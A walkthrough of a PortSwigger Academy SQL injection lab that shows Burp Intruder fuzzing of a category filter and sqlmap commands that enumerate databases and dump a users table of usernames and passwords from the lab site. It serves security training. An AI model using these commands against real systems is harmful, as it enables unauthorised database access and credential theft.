---
title: "PortSwigger Academy — SQL injection UNION attack, retrieving data from other tables (Web) Walkthrough"
---
# SQL injection UNION attack, retrieving data from other tables

```
❓

This lab contains a SQL injection vulnerability in the product category filter. The results from the query are returned in the application's response, so you can use a UNION attack to retrieve data from other tables. To construct such an attack, you need to combine some of the techniques you learned in previous labs.

The database contains a different table called `users`, with columns called `username` and `password`.

To solve the lab, perform a [SQL injection UNION](https://portswigger.net/web-security/sql-injection/union-attacks) attack that retrieves all usernames and passwords, and use the information to log in as the `administrator` user.
```

See  and  for an understanding of how SQLi works.

Start off by selecting one of the filters, I decided to go with “Tech gifts” but this exploit will work on any of the filters.

![image-01.png](image-01.png)

```html
https://0a5200d203c4672d8365643d005c0012.web-security-academy.net/filter?category=Tech+gifts
```

Next up send the URL request over to Intruder in Burp Suite, and set the `Tech+gifts` category as the payload, and load a SQLi wordlist. You can tell a site is susceptible to SQLi if the length of the responses are inconsistent.

![image-02.png](image-02.png)

We can use `sqlmap` to exploit this using the command, proceed with the default prompts.

```bash
sqlmap -u https://0a5200d203c4672d8365643d005c0012.web-security-academy.net/filter?category=Tech+gifts --dbs 
# --dbs enumerates through databases
```

![image-03.png](image-03.png)

Sqlmap has identified multiple different SQLi methods that can be used `boolean-based blind` , `stacked quieries`, `time-based blind` and `UNION query`. There were also databases found as well.

![image-04.png](image-04.png)

We can use this command to list the tables available in the specified database:

```bash
sqlmap https://0a5200d203c4672d8365643d005c0012.web-security-academy.net/filter?category=Tech+gifts --tables --batch 
# --batch executes the command without user input, uses defualt behavior
```

![image-05.png](image-05.png)

Next up we can dump the contents, of the users table using this command:

```bash
sqlmap https://0a5200d203c4672d8365643d005c0012.web-security-academy.net/filter?category=Tech+gifts -D public -T users --batch --dump

```

![image-06.png](image-06.png)
